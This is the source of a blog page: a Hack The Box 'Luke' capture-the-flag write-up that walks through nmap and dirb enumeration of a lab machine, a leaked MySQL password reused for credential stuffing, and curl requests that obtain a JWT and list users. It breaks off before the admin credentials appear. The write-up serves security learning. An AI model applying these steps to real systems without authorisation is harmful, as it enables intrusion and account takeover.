@@ -1,0 +1,1604 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+      Hack The Box - Luke &middot; Ryan Kozak
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <!-- Additional head bits without overriding original head -->
+
+  <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Hack The Box - Luke | Ryan Kozak</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="Hack The Box - Luke" />
+<meta name="author" content="Ryan Kozak" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="hacking, web development, $other" />
+<meta property="og:description" content="hacking, web development, $other" />
+<link rel="canonical" href="http://0.0.0.0:4000/hack-the-box-luke-writeup/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hack-the-box-luke-writeup/" />
+<meta property="og:site_name" content="Ryan Kozak" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-09-15T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box - Luke" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Hack The Box - Luke","dateModified":"2019-09-18T15:49:31+00:00","datePublished":"2019-09-15T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/hack-the-box-luke-writeup/"},"url":"http://0.0.0.0:4000/hack-the-box-luke-writeup/","author":{"@type":"Person","name":"Ryan Kozak"},"description":"hacking, web development, $other","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+</head>
+
+
+  <body class="post">
+
+    <div id="sidebar">
+  <header>
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Ryan Kozak
+      </a>
+    </div>
+    <p class="lead">hacking, web development, $other</p>
+  </header>
+  <nav id="sidebar-nav-links">
+
+  
+    <a class="home-link "
+        href="/">Home</a>
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/about/">About</a>
+    	
+    
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/contact/">Contact</a>
+    	
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/books/index.html">Book List</a>
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+
+  
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+  <!-- Optional additional links to insert in sidebar nav -->
+
+
+</nav>
+
+
+  <nav id="sidebar-icon-links">
+  
+    <a id="github-link"
+       class="icon" title="Github Profile" aria-label="Github Profile"
+       href="https://github.com/d0n601">
+      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path>
+</svg>
+
+    </a>
+  
+
+  
+  <a id="stackoverflow-link"
+     class="icon" title="Stack Overflow Profile" aria-label="Stack Overflow Profile"
+     href="https://stackoverflow.com/users/4681506/ryan-kozak">
+    <?xml version="1.0" encoding="utf-8"?>
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 120 120" style="enable-background:new 0 0 120 120;" xml:space="preserve">
+<style type="text/css">
+	.st0{fill:#BCBBBB;}
+	.st1{fill:#F48023;}
+</style>
+<polygon class="st0" points="84.4,93.8 84.4,70.6 92.1,70.6 92.1,101.5 22.6,101.5 22.6,70.6 30.3,70.6 30.3,93.8 "/>
+<path class="st1" d="M38.8,68.4l37.8,7.9l1.6-7.6l-37.8-7.9L38.8,68.4z M43.8,50.4l35,16.3l3.2-7l-35-16.4L43.8,50.4z M53.5,33.2
+	l29.7,24.7l4.9-5.9L58.4,27.3L53.5,33.2z M72.7,14.9l-6.2,4.6l23,31l6.2-4.6L72.7,14.9z M38,86h38.6v-7.7H38V86z"/>
+</svg>
+
+  </a>
+  
+
+  
+  
+  
+  
+
+  
+    <a id="tags-link"
+       class="icon"
+       title="Tags" aria-label="Tags"
+       href="/tags/">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+    </a>
+  
+
+  
+    <a id="search-link"
+       class="icon"
+       title="Search" aria-label="Search"
+       href="/search/">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+    <path d="M0 0h24v24H0z" fill="none"/>
+</svg>
+    </a>
+  
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+ 
+  <p class="copyright">
+  &copy; 2021 Ryan Kozak.
+</p>
+
+</div>
+
+    <main class="container">
+      <header>
+  <h1 class="post-title">Hack The Box - Luke</h1>
+</header>
+<div class="content">
+  <div class="post-meta">
+  <span class="post-date">15 Sep 2019</span>
+  <span class="post-categories">
+    
+      &bull;
+
+      
+      
+      
+
+      
+        CTF Writeup
+      
+    
+      &bull;
+
+      
+      
+      
+
+      
+        Security
+      
+    
+  </span>
+</div>
+
+  <div class="post-body">
+    <p><img src="/wp-content/uploads/2019/07/luke/badge.png" alt="Hack The Box Luke" /></p>
+
+<h1 id="intro">Intro</h1>
+<p>So they finally retired Luke. While this box was far from one of my favorites, it has a lot of sentimental value to me because it was the first box I rooted after joining <a href="https://hackthebox.eu">Hack The Box</a>. Luke wasn’t all that technically challenging (as you will see in the writeup below). There was a lot of enumeration involved, credential stuffing, a bit of guess work, and no privilege escalation what so ever. It taught me to write down everything during a <del>pentest</del> CTF, even if it seems useless. You never know what you’ll need to use later. All of that said, please find my writeup below, or a <a href="/wp-content/uploads/2019/09/HTB_Luke-d0n601.pdf">download the pdf</a>.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+
+<h3 id="nmap">Nmap</h3>
+<p>We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>nmap <span class="nt">-sVC</span> 10.10.10.137
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-10 18:46 EDT
+Nmap scan report for 10.10.10.137
+Host is up (0.60s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.244
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session upload bandwidth limit
+|      No session download bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
+|_End of status
+22/tcp   open  ssh?
+80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
+|_http-title: Luke
+3000/tcp open  http    Node.js Express framework
+</span><span class="gp">|_http-title: Site doesnt have a title (application/json;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
+<span class="go">8000/tcp open  http    Ajenti http control panel
+|_http-title: Ajenti
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 282.80 seconds
+</span></code></pre></div></div>
+
+<p>From the above output we can see that ports <strong>21</strong>, <strong>22</strong>, <strong>80</strong>, <strong>3000</strong>, and <strong>8000</strong> are all open. This gives us a lot of entry points to begin testing. The FTP port allows anonymous logins, which seems like a good place to start exploring manually. Additionally, the  <em><a href="http://ajenti.org/">Ajenti</a></em> service running on port <code class="highlighter-rouge">8000</code> seems like our ultimate goal, as it’s an administrative control panel.</p>
+
+<h3 id="port-21-anonymous-ftp-exploration">Port 21: Anonymous FTP Exploration</h3>
+<p>Exploring the open FTP port, we only find one file <code class="highlighter-rouge">for_Chihiro.txt</code>.</p>
+
+<p><img src="/wp-content/uploads/2019/07/luke/ftp.png" alt="for_Chihiro.txt" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dear Chihiro !!
+
+As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
+the actual website I've created .
+Normally you should know where to look but hurry up because I will delete them soon because of our security policies !
+
+Derry
+</code></pre></div></div>
+<p>This doesn’t give us a lot of information, but there are two usernames to add to our list, <strong>chihiro</strong> and <strong>derry</strong>.</p>
+
+<h3 id="port-80-apache">Port 80: Apache</h3>
+<p>Next, we run <strong>dirb</strong> in order to enumerate files and directories on the Apache server.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>dirb http://10.10.10.137 <span class="nt">-X</span> <span class="s2">",.php,.txt"</span>
+<span class="go">
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Jun 10 19:09:10 2019
+URL_BASE: http://10.10.10.137/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+EXTENSIONS_LIST: (,.php,.txt) | ()(.php)(.txt) [NUM = 3]
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.137/ ----
++ http://10.10.10.137/config.php (CODE:200|SIZE:202)                                  
+</span><span class="gp">==&gt;</span><span class="w"> </span>DIRECTORY: http://10.10.10.137/css/                                               
+<span class="go">+ http://10.10.10.137/index.html (CODE:200|SIZE:3138)                                 
+</span><span class="gp">==&gt;</span><span class="w"> </span>DIRECTORY: http://10.10.10.137/js/                                                
+<span class="go">+ http://10.10.10.137/LICENSE (CODE:200|SIZE:1093)                                    
++ http://10.10.10.137/login.php (CODE:200|SIZE:1593)                                  
++ http://10.10.10.137/management (CODE:401|SIZE:381)                                  
+</span><span class="gp">==&gt;</span><span class="w"> </span>DIRECTORY: http://10.10.10.137/member/                                            
+<span class="gp">==&gt;</span><span class="w"> </span>DIRECTORY: http://10.10.10.137/vendor/                                            
+<span class="go">
+---- Entering directory: http://10.10.10.137/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.137/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.137/member/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.137/vendor/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+END_TIME: Fri Jun 10 23:52:16 2019
+DOWNLOADED: 13836 - FOUND: 5
+</span></code></pre></div></div>
+
+<p>There is an exposed configuration file found <code class="highlighter-rouge">config.php</code>, which contains the <code class="highlighter-rouge">root</code> password for <code class="highlighter-rouge">MySQL</code>.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$dbHost</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span> <span class="nv">$dbUsername</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span> <span class="nv">$dbPassword</span> <span class="o">=</span> <span class="s1">'Zk6heYCyv6ZE9Xcg'</span><span class="p">;</span> <span class="nv">$db</span> <span class="o">=</span> <span class="s2">"login"</span><span class="p">;</span> <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$dbHost</span><span class="p">,</span> <span class="nv">$dbUsername</span><span class="p">,</span> <span class="nv">$dbPassword</span><span class="p">,</span><span class="nv">$db</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Connect failed: %s</span><span class="se">\n</span><span class="s2">"</span><span class="mf">.</span> <span class="nv">$conn</span> <span class="o">-&gt;</span> <span class="n">error</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="port-3000-nodejs">Port 3000: NodeJS</h3>
+<p>As we did with port <code class="highlighter-rouge">80</code>, we run <strong>dirb</strong> in order to enumerate directories. Since this appears to be an API returning JSON we’re not including any file extensions in the scan.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>dirb http://10.10.10.137:3000 <span class="nt">-w</span>
+<span class="go">
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Jun 11 00:38:53 2019
+URL_BASE: http://10.10.10.137:3000/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Not Stopping on warning messages
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.137:3000/ ----
++ http://10.10.10.137:3000/login (CODE:200|SIZE:13)                                   
++ http://10.10.10.137:3000/Login (CODE:200|SIZE:13)                                   
++ http://10.10.10.137:3000/users (CODE:200|SIZE:56)                                   
+
+-----------------
+END_TIME: Fri Jun 11 01:36:36 2019
+DOWNLOADED: 4612 - FOUND: 3
+</span></code></pre></div></div>
+
+<p>Luke is very much an exercise in enumeration. We see from the above scan that there are endpoints on port <code class="highlighter-rouge">3000</code> for <code class="highlighter-rouge">/login</code>, and <code class="highlighter-rouge">/users</code>. When we use another HTTP enumeration tool (dirbuster) we discover the sub directory  <code class="highlighter-rouge">/users/admin</code>. This is an important reminder that not all wordlists and tools behave the same way, and we must try different things when we’re stuck. In this instance <code class="highlighter-rouge">dirb</code> was supposed to be scanning recursively, but ignored this subdirectory.</p>
+
+<p><img src="/wp-content/uploads/2019/07/luke/dirbuster.png" alt="dirbuster on port 3000 discovers /usrs/admin" /></p>
+
+<h3 id="port-8000-ajenti">Port 8000: Ajenti</h3>
+<p>HTTP enumeration on port 8000 failed to discover anything. All we know is that there’s a login page available to us, and that we need to get in.</p>
+
+<p><img src="/wp-content/uploads/2019/07/luke/ajenti.png" alt="Ajenti Login Page on Port 8000" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<p>Now we’ve gathered all the information we can and it’s time to begin our attack. So far we have collected four login pages and two potential user names. In order to increase our potential user count we add <code class="highlighter-rouge">root</code>, <code class="highlighter-rouge">admin</code>, and <code class="highlighter-rouge">administrator</code> to the list, as they’re common on most systems. We will also try different capitalizations of the names if we fail to login to any of our entry points after exhausting the list.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Login Pages</strong></th>
+      <th><strong>Potential Users</strong></th>
+      <th><strong>Passwords</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>http://10.10.10.137/login.php</td>
+      <td>admin</td>
+      <td>Zk6heYCyv6ZE9Xcg</td>
+    </tr>
+    <tr>
+      <td>http://10.10.10.137/management/</td>
+      <td>administrator</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>http://10.10.10.137:3000/login</td>
+      <td>chihiro</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>http://10.10.10.137:8000</td>
+      <td>derry</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td> </td>
+      <td>root</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Our first point to attack is port <code class="highlighter-rouge">8000</code>, as it’s the most critical. After a bit of research the default credentials to Ajenti appear to be <code class="highlighter-rouge">root</code> for a username and <code class="highlighter-rouge">admin</code> for a password, but these do not work in this case. None of our potential users in combination with our MySQL password, authenticate us on Ajenti. Now we move on to the other services. After trying our list of potential users and password on port <code class="highlighter-rouge">8000</code> first, <code class="highlighter-rouge">/login.php</code> second, and <code class="highlighter-rouge">/management</code> third, we’ve not succeeded to login to any of them.</p>
+
+<p>Port <code class="highlighter-rouge">3000</code> requires we craft some headers properly in order to attempt to authenticate, and out of laziness it’s the last on the list of login pages to try our credentials on.</p>
+
+<h3 id="json-web-tokens">JSON Web Tokens</h3>
+<p>When we attempt to visit port <code class="highlighter-rouge">3000</code> we’re given the following response indicating we’re not authenticated.</p>
+<pre><code class="language-JSON">{"success":false,"message":"Auth token is not supplied"}
+</code></pre>
+
+<p>When we sent a GET request to the the <code class="highlighter-rouge">/login</code> endpoint we’re returned text asking us to authenticate.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl http://10.10.10.137:3000/login
+<span class="go">"please auth"
+</span></code></pre></div></div>
+
+<p>If we try and emulate a form, we see that the <code class="highlighter-rouge">/login</code> endpoint returns us <code class="highlighter-rouge">bad request</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl <span class="nt">-F</span> <span class="s2">"username=root"</span> <span class="nt">-F</span> <span class="s2">"password=Zk6heYCyvZk6heYCyv6ZE9Xcg"</span> <span class="nt">-X</span> POST http://10.10.10.137:3000/login
+<span class="go">Bad Request
+</span></code></pre></div></div>
+
+<p>Some <a href="https://medium.com/hyphe/token-based-authentication-in-node-6e8731bfd7f2">brief research</a> on NodeJS and JSON tokens shows us how to craft the proper header. Now, we’re getting a <code class="highlighter-rouge">forbidden</code> response. This seems like our query is correct now, but our credentials are not.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s1">'Accept: application/json'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">--data</span> <span class="s1">'{"username":"root","password":"Zk6heYCyv6ZE9Xcg","rememberMe":true}'</span> http://10.10.10.137:3000/login
+<span class="go">Forbidden
+</span></code></pre></div></div>
+
+<p>Intuition was key to success here, as the username <code class="highlighter-rouge">admin</code> appears to also use the MySQL root password we’ve previously found. Had we not added this to our list of usernames, we’d have been dead in the water. We see below that we’re given the JWT to authenticate us on port <code class="highlighter-rouge">3000</code>.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s1">'Accept: application/json'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">--data</span> <span class="s1">'{"username":"admin","password":"Zk6heYCyv6ZE9Xcg","rememberMe":true}'</span> http://10.10.10.137:3000/login
+<span class="go">{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI"}r
+</span></code></pre></div></div>
+
+<p>Lets use this token to get more info if we can. After a little playing around with the request headers we’re able to authenticate into the <code class="highlighter-rouge">/users</code> directory, which returns a list of usernames.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl <span class="nt">-H</span> <span class="s1">'Accept: application/json'</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI"</span> http://10.10.10.137:3000/users
+<span class="go">[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
+</span></code></pre></div></div>
+
+<p>We also know that theres an endpoint <code class="highlighter-rouge">/users/admin</code>, and when we visit that we’re given some credentials in plain text!</p>
